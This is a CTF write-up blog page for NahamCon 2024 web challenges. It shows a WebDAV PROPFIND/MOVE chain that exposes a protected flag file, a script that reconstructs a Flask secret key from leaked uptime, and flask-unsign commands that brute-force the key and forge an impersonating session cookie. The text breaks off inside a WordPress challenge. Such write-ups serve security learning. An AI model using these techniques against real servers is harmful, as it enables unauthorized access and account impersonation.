

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>NahamCon CTF 2024 - writeups - xeunwa</title><meta name="Description" content="WebDav, A lot of Brute-forcing &#43; Wordpress whitebox"><meta property="og:url" content="https://xeunwa.github.io/nahamcon-ctf-2024/">
  <meta property="og:site_name" content="xeunwa">
  <meta property="og:title" content="NahamCon CTF 2024 - writeups">
  <meta property="og:description" content="WebDav, A lot of Brute-forcing &#43; Wordpress whitebox">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-29T02:46:00+08:00">
    <meta property="article:modified_time" content="2024-05-29T02:46:00+08:00">
    <meta property="article:tag" content="WebDav">
    <meta property="article:tag" content="Flask">
    <meta property="article:tag" content="Flask Session">
    <meta property="article:tag" content="Code Review">
    <meta property="article:tag" content="WordPress">
    <meta property="article:tag" content="Brute-Force">
    <meta property="og:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
  <meta name="twitter:title" content="NahamCon CTF 2024 - writeups">
  <meta name="twitter:description" content="WebDav, A lot of Brute-forcing &#43; Wordpress whitebox">
<meta name="application-name" content="DoIt">
<meta name="apple-mobile-web-app-title" content="DoIt">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://xeunwa.github.io/nahamcon-ctf-2024/" /><link rel="prev" href="https://xeunwa.github.io/time-traveler/" /><link rel="next" href="https://xeunwa.github.io/huntress-ctf-2024/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "NahamCon CTF 2024 - writeups",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/xeunwa.github.io\/nahamcon-ctf-2024\/"
        },"image": ["https:\/\/xeunwa.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "WebDav, flask, flask Session, Code Review, WordPress, Brute-Force","wordcount":  1882 ,
        "url": "https:\/\/xeunwa.github.io\/nahamcon-ctf-2024\/","datePublished": "2024-05-29T02:46:00+08:00","dateModified": "2024-05-29T02:46:00+08:00","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/avatars.githubusercontent.com\/u\/72879902?v=4"},"authors": [{
                        "@type": "Person",
                        "name": "xeunwa"                    
                    }],"description": "WebDav, A lot of Brute-forcing + Wordpress whitebox"
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('black' === 'light' || 'black' === 'dark' || 'black' === 'black') setTheme('black'), saveTheme('black'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="xeunwa"><img
        class="logo"
        loading="lazy"
        src="https://avatars.githubusercontent.com/u/72879902?v=4"
        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
        sizes="auto"
        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/categories/ctf/"> Writeups </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/whoami/"> whoami </a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="xeunwa"><img
        class="logo"
        loading="lazy"
        src="https://avatars.githubusercontent.com/u/72879902?v=4"
        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
        sizes="auto"
        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/categories/ctf/" title="">Writeups</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/whoami/" title="">whoami</a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#the-davinci-code-50-pts">The Davinci Code (50 pts)</a>
          <ul>
            <li><a href="#attack-chain">Attack Chain</a></li>
            <li><a href="#move-the-flag">MOVE the flag</a></li>
          </ul>
        </li>
        <li><a href="#thomas-deverson-175-pts">Thomas DEVerson (175 pts)</a>
          <ul>
            <li><a href="#backup">/backup</a></li>
            <li><a href="#get_secretpy">get_secret.py</a></li>
            <li><a href="#brute-force-flask-key">brute-force flask key</a></li>
          </ul>
        </li>
        <li><a href="#secret-info-460-pts">Secret Info (460 pts)</a>
          <ul>
            <li><a href="#registration-through-admin-ajax">Registration through admin-ajax</a></li>
            <li><a href="#brute-forcing-media-content">Brute-Forcing media content</a></li>
          </ul>
        </li>
        <li><a href="#wp-elevator-in-progress">WP Elevator (in-progress)</a></li>
      </ul>
    </li>
    <li><a href="#scripting">Scripting</a>
      <ul>
        <li><a href="#base3200-50-pts">Base3200 (50 pts)</a></li>
        <li><a href="#hashes-on-hashes-on-hashes-310-pts">Hashes on Hashes on Hashes (310 pts)</a>
          <ul>
            <li><a href="#message-decryption">Message decryption</a></li>
            <li><a href="#decryptpy">decrypt.py</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NahamCon CTF 2024 - writeups</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class='author'><span class="author fas fa-user-circle fa-fw"></span><span class='screen-reader-text'>  </span><a href='https://xeunwa.github.io/authors/xeunwa'>xeunwa</a></span>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/scripting/"><i class="far fa-folder fa-fw"></i>Scripting</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-05-29">2024-05-29</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-05-29">2024-05-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1882 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#the-davinci-code-50-pts">The Davinci Code (50 pts)</a>
          <ul>
            <li><a href="#attack-chain">Attack Chain</a></li>
            <li><a href="#move-the-flag">MOVE the flag</a></li>
          </ul>
        </li>
        <li><a href="#thomas-deverson-175-pts">Thomas DEVerson (175 pts)</a>
          <ul>
            <li><a href="#backup">/backup</a></li>
            <li><a href="#get_secretpy">get_secret.py</a></li>
            <li><a href="#brute-force-flask-key">brute-force flask key</a></li>
          </ul>
        </li>
        <li><a href="#secret-info-460-pts">Secret Info (460 pts)</a>
          <ul>
            <li><a href="#registration-through-admin-ajax">Registration through admin-ajax</a></li>
            <li><a href="#brute-forcing-media-content">Brute-Forcing media content</a></li>
          </ul>
        </li>
        <li><a href="#wp-elevator-in-progress">WP Elevator (in-progress)</a></li>
      </ul>
    </li>
    <li><a href="#scripting">Scripting</a>
      <ul>
        <li><a href="#base3200-50-pts">Base3200 (50 pts)</a></li>
        <li><a href="#hashes-on-hashes-on-hashes-310-pts">Hashes on Hashes on Hashes (310 pts)</a>
          <ul>
            <li><a href="#message-decryption">Message decryption</a></li>
            <li><a href="#decryptpy">decrypt.py</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Writeups for some web and scripting challenges including the wordpress whitebox challenges</p>
<p><strong>team</strong>: Cipher Layer <strong>points</strong>: 2294 <strong>rank</strong>: 250/2632</p>
<hr>
<h1 id="web" class="headerLink">
    <a href="#web" class="header-mark"></a>Web</h1><h2 id="the-davinci-code-50-pts" class="headerLink">
    <a href="#the-davinci-code-50-pts" class="header-mark"></a>The Davinci Code (50 pts)</h2><blockquote>
<p>Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken&hellip;</p>
</blockquote>
<p><code>#webdav</code></p>
<p>This is a challenge relating to WebDav. We can see in the <code>/code</code> path that it returns a error and discloses the flask source code. The base path <code>/</code> with supported methods=<code>['GET', 'PROPFIND']</code> is shown. Using <code>PROPFIND</code> function and performing directory listing/traversal will lead us to a directory with a flag.txt. We cannot read this directly, but we do know the location of the flag.</p>
<p>Knowing about <code>PROPFIND</code> we can fingerprint its probably using webdav and learn above some additional methods like <code>MOVE</code>
<a href="https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926%28v=exchg.65%29" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926(v=exchg.65)</a>.</p>
<!-- <a class="lightgallery" href="/nahamcon-ctf-2024/image.png" title="/nahamcon-ctf-2024/image.png" data-thumbnail="/nahamcon-ctf-2024/image.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image.png"
            srcset="/nahamcon-ctf-2024/image.png, /nahamcon-ctf-2024/image.png 1.5x, /nahamcon-ctf-2024/image.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image.png" height="485"  width="100%" >
    </a> -->
<h3 id="attack-chain" class="headerLink">
    <a href="#attack-chain" class="header-mark"></a>Attack Chain</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">GET /code
</span></span><span class="line"><span class="cl"><span class="c1"># directory listing /</span>
</span></span><span class="line"><span class="cl">PROPFIND / 
</span></span><span class="line"><span class="cl"><span class="c1"># we can find /the_secret_dav_inci_codef/flag.txt</span>
</span></span><span class="line"><span class="cl">PROPFIND /the_secret_dav_inci_code 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># move unaccessible resource to static </span>
</span></span><span class="line"><span class="cl">MOVE /the_secret_dav_inci_code/flag.txt HTTP/1.1
</span></span><span class="line"><span class="cl">Destination: /static/flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GET /static/flag.txt 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="move-the-flag" class="headerLink">
    <a href="#move-the-flag" class="header-mark"></a>MOVE the flag</h3><p><a class="lightgallery" href="/nahamcon-ctf-2024/image-21.png" title="/nahamcon-ctf-2024/image-21.png" data-thumbnail="/nahamcon-ctf-2024/image-21.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-21.png"
            srcset="/nahamcon-ctf-2024/image-21.png, /nahamcon-ctf-2024/image-21.png 1.5x, /nahamcon-ctf-2024/image-21.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-21.png" height="344"  width="100%" >
    </a>
<a class="lightgallery" href="/nahamcon-ctf-2024/static.png" title="/nahamcon-ctf-2024/static.png" data-thumbnail="/nahamcon-ctf-2024/static.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/static.png"
            srcset="/nahamcon-ctf-2024/static.png, /nahamcon-ctf-2024/static.png 1.5x, /nahamcon-ctf-2024/static.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/static.png" height="341"  width="100%" >
    </a></p>
<h2 id="thomas-deverson-175-pts" class="headerLink">
    <a href="#thomas-deverson-175-pts" class="header-mark"></a>Thomas DEVerson (175 pts)</h2><blockquote>
<p>All things considered, I&rsquo;m impressed this website is still up and running 200 years later.</p>
</blockquote>
<p><code>#flask-session</code> <code>#brute-force</code></p>
<p>Flask session brute-forcing challenge. There is a source code disclosure in <code>/backup</code> revealing the secret_key value which eappends current datetime value to the flask secret. <code>THE_REYNOLDS_PAMPHLET-</code>  We are also given available users</p>
<h3 id="backup" class="headerLink">
    <a href="#backup" class="header-mark"></a>/backup</h3><a class="lightgallery" href="/nahamcon-ctf-2024/image-3.png" title="/nahamcon-ctf-2024/image-3.png" data-thumbnail="/nahamcon-ctf-2024/image-3.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-3.png"
            srcset="/nahamcon-ctf-2024/image-3.png, /nahamcon-ctf-2024/image-3.png 1.5x, /nahamcon-ctf-2024/image-3.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-3.png" height="608"  width="100%" >
    </a>
<!-- ![Alt text](image-3.png) -->
<p>Clue when the <code>datetime.now()</code> was initially ran in <code>/status</code></p>
<a class="lightgallery" href="/nahamcon-ctf-2024/image-2.png" title="/nahamcon-ctf-2024/image-2.png" data-thumbnail="/nahamcon-ctf-2024/image-2.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-2.png"
            srcset="/nahamcon-ctf-2024/image-2.png, /nahamcon-ctf-2024/image-2.png 1.5x, /nahamcon-ctf-2024/image-2.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-2.png" height="136"  width="100%" >
    </a>
<p>From this we can learn try and generate a valid secret by subtracting current date to the returned output from status.</p>
<h3 id="get_secretpy" class="headerLink">
    <a href="#get_secretpy" class="header-mark"></a>get_secret.py</h3><p>I used this script to potentially find the exact value of the secret by subtracting current datetime with the results from /status but did not work. It helped since I got the year and close with the correct value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> 
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://challenge.nahamcon.com:31915/status&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(\d+) days (\d+) hours (\d+) minutes&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">days</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">hours</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">minutes</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">current_date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl">    <span class="n">timedelta_to_subtract</span> <span class="o">=</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="n">days</span><span class="p">,</span> <span class="n">hours</span><span class="o">=</span><span class="n">hours</span><span class="p">,</span> <span class="n">minutes</span><span class="o">=</span><span class="n">minutes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">resulting_date</span> <span class="o">=</span> <span class="n">current_date</span> <span class="o">-</span> <span class="n">timedelta_to_subtract</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Resulting date and time:&#34;</span><span class="p">,</span> <span class="n">resulting_date</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">formatted</span> <span class="o">=</span> <span class="n">resulting_date</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;%Y%m</span><span class="si">%d</span><span class="s2">%H%M&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">secret_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;THE_REYNOLDS_PAMPHLET-</span><span class="si">{</span><span class="n">formatted</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>output <code>THE_REYNOLDS_PAMPHLET-179708251645</code>. We can try this and forge our own cookie and submit to the <code>/message</code> endpoint but this will not work.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;name&#39;: &#39;Jefferson&#39;}&#34;</span> --secret <span class="s1">&#39;THE_REYNOLDS_PAMPHLET-179708251645&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since we already know parts of the key and the rest are just datetime integers can just brute-force this since we know its year/month is most likely correct. Worst case brute-force each digit which is not that complex as well.</p>
<h3 id="brute-force-flask-key" class="headerLink">
    <a href="#brute-force-flask-key" class="header-mark"></a>brute-force flask key</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>0..99999<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;THE_REYNOLDS_PAMPHLET-1797082</span><span class="nv">$i</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span> &gt; words.txt
</span></span></code></pre></td></tr></table>
</div>
</div><a class="lightgallery" href="/nahamcon-ctf-2024/image-5.png" title="/nahamcon-ctf-2024/image-5.png" data-thumbnail="/nahamcon-ctf-2024/image-5.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-5.png"
            srcset="/nahamcon-ctf-2024/image-5.png, /nahamcon-ctf-2024/image-5.png 1.5x, /nahamcon-ctf-2024/image-5.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-5.png" height="130"  width="100%" >
    </a>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># brute-force flask session cookie</span>
</span></span><span class="line"><span class="cl">flask-unsign --unsign --cookie &lt; cookie.txt --wordlist words.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># forge our own session token</span>
</span></span><span class="line"><span class="cl">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;name&#39;: &#39;Jefferson&#39;}&#34;</span> --secret <span class="s1">&#39;THE_REYNOLDS_PAMPHLET-179708250845&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>output: <code>eyJuYW1lIjoiSmVmZmVyc29uIn0.ZlDoZA.S5h0UBS1jk8CX4I9P5jCrVsBDOA</code> paste to our session cookie and get the flag</p>
<a class="lightgallery" href="/nahamcon-ctf-2024/image-7.png" title="/nahamcon-ctf-2024/image-7.png" data-thumbnail="/nahamcon-ctf-2024/image-7.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-7.png"
            srcset="/nahamcon-ctf-2024/image-7.png, /nahamcon-ctf-2024/image-7.png 1.5x, /nahamcon-ctf-2024/image-7.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-7.png" height="590"  width="100%" >
    </a>
<!-- ![Alt text](image-11.png) -->
<h2 id="secret-info-460-pts" class="headerLink">
    <a href="#secret-info-460-pts" class="header-mark"></a>Secret Info (460 pts)</h2><p><code>#wordpress</code> <code>#code-review</code></p>
<p>Under Sponsorship category. This is a Whitebox web challenge involving wordpress.</p>
<blockquote>
<p>Our admin accidentally published some secret images on our site. Unfortunately, somehow we are not able to unpublish the secret image, however, we tried to apply some protection to our site. This should be enough, right?
This is a fully white box challenge, almost no heavy brute force is needed.</p>
</blockquote>
<p>We are provided a wordpress source code with docker file. The only thing here that might be related to the challenge is the <code>test-plugin.php</code> and the flag.png.</p>
<a class="lightgallery" href="/nahamcon-ctf-2024/image-11.png" title="/nahamcon-ctf-2024/image-11.png" data-thumbnail="/nahamcon-ctf-2024/image-11.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-11.png"
            srcset="/nahamcon-ctf-2024/image-11.png, /nahamcon-ctf-2024/image-11.png 1.5x, /nahamcon-ctf-2024/image-11.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-11.png" height="606"  width="100%" >
    </a>
<p>When we register through browser, we can&rsquo;t actually activate our account because our the email service is not working and we can&rsquo;t confirm our account and login. There is no way to register through the browser. This is where the <strong>feature</strong> in the <code>test-plugin.php</code> will be used.</p>
<h3 id="registration-through-admin-ajax" class="headerLink">
    <a href="#registration-through-admin-ajax" class="header-mark"></a>Registration through admin-ajax</h3><p>Looking at the <code>test-plugin.php</code> I tried to learn about what this source code and simply asked my friend Chat-GPT</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
